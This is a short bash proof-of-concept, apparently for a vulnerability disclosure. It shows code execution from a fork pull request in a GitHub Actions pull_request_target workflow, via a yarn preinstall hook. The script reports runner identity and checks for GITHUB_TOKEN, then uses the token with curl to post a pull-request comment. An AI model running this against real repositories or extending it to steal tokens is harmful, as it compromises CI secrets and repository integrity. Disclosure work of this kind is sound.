#!/usr/bin/env bash
# Benign PoC for pull_request_target RCE in lint-commit.yml.
# Demonstrates: (1) arbitrary code execution on the runner from a fork PR,
# (2) availability of GITHUB_TOKEN in the runner env, by posting an
# authenticated comment to the PR as github-actions[bot].
set -u

echo "=================================================="
echo "[PoC] preinstall script executing on the runner"
echo "[PoC] whoami: $(whoami 2>/dev/null || true)"
echo "[PoC] id:     $(id 2>/dev/null || true)"
echo "[PoC] pwd:    $(pwd)"
echo "[PoC] repo:   ${GITHUB_REPOSITORY:-?}"
echo "[PoC] event:  ${GITHUB_EVENT_NAME:-?}"
echo "[PoC] has GITHUB_TOKEN env: $([ -n "${GITHUB_TOKEN:-}" ] && echo yes || echo no)"
echo "=================================================="

# PR number lives in the event payload.
PR_NUM="$(jq -r '.pull_request.number // .number // empty' "${GITHUB_EVENT_PATH:-/dev/null}" 2>/dev/null || true)"
echo "[PoC] PR number: ${PR_NUM:-unknown}"

if [ -n "${GITHUB_TOKEN:-}" ] && [ -n "${PR_NUM:-}" ]; then
  BODY='{"body":"🛑 **Proof-of-concept**: this comment was posted by a `preinstall` script in a fork PR, using `GITHUB_TOKEN` exposed to the `lint-commit.yml` workflow. Demonstrates RCE via `pull_request_target` + checkout of PR head + `yarn add` against attacker-controlled `package.json`. Payload is benign; no secrets were exfiltrated."}'
  curl -sS -X POST \
    -H "Authorization: Bearer ${GITHUB_TOKEN}" \
    -H "Accept: application/vnd.github+json" \
    -H "Content-Type: application/json" \
    -d "${BODY}" \
    "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${PR_NUM}/comments" \
    | head -c 300
  echo
  echo "[PoC] comment POST attempted."
fi

# Always exit 0 so yarn doesn't bail before we've proven the point.
exit 0
